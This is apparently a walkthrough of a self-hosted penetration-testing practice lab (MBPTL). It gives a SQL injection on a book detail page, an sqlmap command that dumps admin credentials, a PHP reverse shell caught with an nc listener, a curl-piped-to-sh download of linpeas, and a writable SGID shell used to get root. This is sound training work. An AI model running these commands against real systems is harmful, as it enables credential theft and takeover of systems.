
### SETUP

Beacuse this machine using docker to setup, so you can easty to setup this.
1. Choose the path location you want to store the machine cred
2. Clone repository, you can use this command 

```git
git clone https://github.com/bayufedra/MBPTL
```

4. And you can see this
```
┌──(m1kasha㉿kali)-[~/machine/MBPTL/mbptl]
└─$ ls
administrator  bookstore  database  docker-compose.yml  run.sh

```

for me, need to correct the `run.sh` file for setup, idk whay but it's can different on your machine.
run.sh
```sh
┌──(m1kasha㉿kali)-[~/machine/MBPTL/mbptl]
└─$ ls
administrator  bookstore  database  docker-compose.yml  run.sh
┌──(m1kasha㉿kali)-[~/machine/MBPTL/mbptl]
└─$ cat run.sh             
sudo docker-compose down -v
sudo docker-compose build
sudo docker-compose up -d

```

make sure, machine success to creat container and running at localhost/other you want. This the example if success to create container
```bash
┌──(m1kasha㉿kali)-[~/machine/MBPTL/mbptl]
└─$ sudo docker ps               
[sudo] password for m1kasha: 
CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                   NAMES
520b71d2867f   mbptl_administrator   "docker-php-entrypoi…"   33 minutes ago   Up 33 minutes   0.0.0.0:8080->80/tcp, :::8080->80/tcp   mbptl-administrator
b3c0f3bc1703   mbptl_bookstore       "docker-php-entrypoi…"   33 minutes ago   Up 33 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp       mbptl-bookstore
edde9ec6b28c   mbptl_db              "docker-entrypoint.s…"   33 minutes ago   Up 33 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp     mbptl-db
```

check using http://localhost  OR http://127.0.0.1 . Make sure you know this machine run on 2 port, 80 and 8080, you can see at the `docker-compose.yml` file.
### ENUMERATION

Directory Brute

```bash
gobuster dir -u http://127.0.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
/img                  (Status: 301) [Size: 304] [--> http://127.0.0.1/img/]
/inc                  (Status: 301) [Size: 304] [--> http://127.0.0.1/inc/]
/server-status        (Status: 403) [Size: 274]
Progress: 220560 / 220561 (100.00%)

```

Try on port 8080 to
```bash
gobuster dir -u http://127.0.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
/administrator        (Status: 301) [Size: 321] [--> http://127.0.0.1:8080/administrator/]
/server-status        (Status: 403) [Size: 276]
Progress: 220560 / 220561 (100.00%)

```

try to access /administrator page

![[Pasted image 20241116152025.png]]

Login page for admin. Save this.

### FOOTHOLD
Try curl on base port 80
```php
┌──(m1kasha㉿kali)-[~/machine/MBPTL/solver]
└─$ curl http://127.0.0.1/

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Library</title>
    <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <style>
    body {
      padding-bottom: 70px; /* Adjust as needed to prevent the footer from overlapping content */
    }
    .footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background-color: #f8f9fa; /* Bootstrap's background color for light theme */
      text-align: center;
      padding: 10px;
    }
  </style></head>
<body>

<div class="container mt-4">
  <h2>List of Books</h2>
  <table class="table">
    <thead>
      <tr>
        <th>ID</th>
        <th>Title</th>
        <th>Author</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>
      <tr>
                      <td>1</td>
                      <td>Howl's Moving Castle</td>
                      <td>Diana Wynne Jones</td>
                      <td><a href="detail.php?id=1">View Details</a></td>
                    </tr><tr>
                      <td>2</td>
                      <td>Spirited Away</td>
                      <td>Hayao Miyazaki</td>
                      <td><a href="detail.php?id=2">View Details</a></td>
                    </tr><tr>
                      <td>3</td>
                      <td>My Neighbor Totoro</td>
                      <td>Hayao Miyazaki</td>
                      <td><a href="detail.php?id=3">View Details</a></td>
                    </tr><tr>
                      <td>4</td>
                      <td>Princess Mononoke</td>
                      <td>Hayao Miyazaki</td>
                      <td><a href="detail.php?id=4">View Details</a></td>
                    </tr><tr>
                      <td>5</td>
                      <td>Kiki's Delivery Service</td>
                      <td>Eiko Kadono</td>
                      <td><a href="detail.php?id=5">View Details</a></td>
                    </tr><tr>
                      <td>6</td>
                      <td>The Secret World of Arrietty</td>
                      <td>Mary Norton</td>
                      <td><a href="detail.php?id=6">View Details</a></td>
                    </tr><tr>
                      <td>7</td>
                      <td>Castle in the Sky</td>
                      <td>Hayao Miyazaki</td>
                      <td><a href="detail.php?id=7">View Details</a></td>
                    </tr><tr>
                      <td>8</td>
                      <td>Whisper of the Heart</td>
                      <td>Aoi Hiiragi</td>
                      <td><a href="detail.php?id=8">View Details</a></td>
                    </tr>    </tbody>
  </table>
</div>

<div class="footer">
  <p>&copy; 2024 Most Basic Penetration Labs</p>
</div>

<!-- Bootstrap JS and Popper.js (required for Bootstrap functionality) -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>

```

What do you think after see the code ?, yes if you has do review the code before, it's fast for you know what's the vuln on the code. Try SQL Injection using click details in any book.

### EXPLOITATION

| Key          | Fill                             |
| ------------ | -------------------------------- |
| Affected URL | http://127.0.0.1/detail.php?id=1 |
| Vuln         | SQL INJECTION                    |
| CVE          | coding                           |
| CWE          |                                  |
| CVSS         |                                  |

POC
1. Confirm the SQL INJECTION is Valid, base url http://127.0.0.1/detail.php?id=1, try to add http://127.0.0.1/detail.php?id=1 AND 1=1, and see the below

![[Pasted image 20241116150527.png]]

Yes, we confirm that vuln SQLI, next using SQLMAP to dump credential or you can use the manual SQLI to.
Finall payload :
```bash
sqlmap -u "http://localhost/detail.php?id=1" --batch --random-agent -D administrator -T users -C username,password --dump 

```

result

![[Pasted image 20241116150732.png]]

crack the hash, use : https://hashes.com/en/decrypt/hash

and you get the password. 

Login on port 8080 and /administrator

![[Pasted image 20241116152434.png]]

Try upload PHP REV SHELL, you can use : https://www.revshells.com/ and i use tes:tes:tes on filling the title, author and desc

setup listener

```bash
nc -lnvp 9001   
```

success to upload but where the file so that we can trigger the rev shell. Notice in port 80 you can view detail produk

![[Pasted image 20241116152657.png]]

Click view details in tes.
check the listener

```bash
┌──(m1kasha㉿kali)-[~/machine/MBPTL/solver]
└─$ nc -lnvp 9001    
listening on [any] 9001 ...
connect to [192.168.200.219] from (UNKNOWN) [172.21.0.4] 40404
Linux 520b71d2867f 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64 GNU/Linux
 07:26:41 up  3:05,  0 users,  load average: 2.72, 2.31, 1.53
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off

```
### PRIV ESC

Using linpeash

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

```

Notice this result
```bash
╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /sbin/unix_chkpwd
-rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
You can write SGID file: /bin/bahs

```

So i just try /bin/bahs
```bash
/bin/bahs
ls
backups
cache
lib
local
lock
log
mail
opt
run
spool
tmp
www
whoami
root
```

Boom rooted.